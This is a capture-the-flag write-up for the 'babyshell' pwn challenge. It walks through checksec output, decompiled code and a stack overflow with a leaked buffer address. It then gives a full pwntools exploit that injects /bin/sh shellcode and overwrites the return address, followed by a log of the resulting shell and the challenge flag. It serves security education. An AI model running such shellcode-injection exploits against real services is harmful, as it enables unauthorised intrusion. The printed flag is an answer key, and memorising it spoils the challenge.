# Babyshell :shell:

## Description: 

* You found a little baby crying inside a basket! It looks like it lost its shell-toy. Please, buy a new one for the poor baby.

## Objective: 

* Take advantage of *BufferOverflow* , `NX` disabled and leaked `buffer address`to inject shellcode.

## Flag: :black_flag:
* UNIWA{b4by_l0v3s_th3_sh3ll}

## Challenge:

First of all, we start with a `checksec`:  

```sh
gef➤  checksec 
[+] checksec for '/home/w3th4nds/github/UniWA_CTF_2020-2021/pwn/baby_shell/babyshell'
Canary                        : ✘ 
NX                            : ✘ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Full
```

As we can see only `PIE` is enabled.

The interface of the program looks like this:

```sh
w3th4nds@void:~/github/UniWA_CTF_2020-2021/pwn/baby_shell$ ./babyshell 
~Inside the toy store~

Current cash: 6.9$

[1] Pay with cash (22.69$).
[2] Enter gift code.
> 2
Insert gift code:
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
This is a gift-code for your next purchase: [0x7ffdba507ce0]
Do you need anything else?
```

We see there are 2 options and a `leak`.  

### Disassembly :pick:

Starting fro `main`:

```c
undefined8 main(void)

{
  int iVar1;
  undefined local_48 [32];
  char local_28 [28];
  int local_c;
  
  setup();
  puts("~Inside the toy store~\n");
  printf((char *)0x401b99999999999a,"Current cash: %.1f$\n\n");
  printf("[1] Pay with cash (22.69$).\n[2] Enter gift code.\n> ");
  __isoc99_scanf(&DAT_00100b3c,&local_c);
  if (local_c == 1) {
    printf("You do not have enough money!");
  }
  else {
    if (local_c == 2) {
      printf("Insert gift code:\n> ");
      read(0,local_28,10);
      iVar1 = strcmp("tw1nkl3tw1nkl3",local_28);
      if (iVar1 == 0) {
        puts("The gift code is not valid!");
                    /* WARNING: Subroutine does not return */
        exit(0x45);
      }
      printf("This is a gift-code for your next purchase: [%p]\nDo you need anything else?\n> ",
             local_48);
      __isoc99_scanf(&DAT_00100bef,local_48);
    }
  }
  return 0;
}
```

As we can see, we have a `leak` of the buffer we write (`local_48`).

We also have an `Overflow` due to `scanf` having no limits here.

So, our goal is:

* Save`leaked` address.
* Fill the buffer with our `shellcode` and `nops` and overwrite the `return` address with our `leaked` address.

We found form `gdb` that the `return` address is after 72 bytes:

```gdb
[+] Found at offset 72 (big-endian search)
```

The final payload looks like this:

```python
payload = sc.ljust(72, b'\x90') + p64(leaked)
```

### Exploit :scroll:

```python
#!/usr/bin/python3
from pwn import *

ip = 'ctf.uniwa.gr' # change this
port = 6969 # change this
fname = './babyshell' # change this

LOCAL = False

if LOCAL:
	r = process(fname)
else:
	r = remote(ip, port)

ru = lambda x : r.recvuntil(x)
inter = lambda : r.interactive()
sla = lambda x,y : r.sendlineafter(x,y)

def pwn():
	sla('>', '2')
	sla('>', 'random')
	sc = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

	ru('[')
	leaked = int(ru(']')[:-1],16)
	print('Leaked: 0x{:x}'.format(leaked)) 
	payload = sc.ljust(72, b'\x90') + p64(leaked)
	sla('>', payload)
	inter()


if __name__ == '__main__':
	pwn()
```



### PoC: :checkered_flag:

```sh
w3th4nds@void:~/github/UniWA_CTF_2020-2021/pwn/baby_shell$ ./exp.py 
[+] Starting local process './babyshell': pid 9572
Leaked: 0x7ffc2582f8d0
[*] Switching to interactive mode
 $ ls
Makefile  README.md  babyshell    babyshell.c  core  exp.py  flag.txt
$ cat flag.txt
UNIWA{b4by_l0v3s_th3_sh3ll}
```

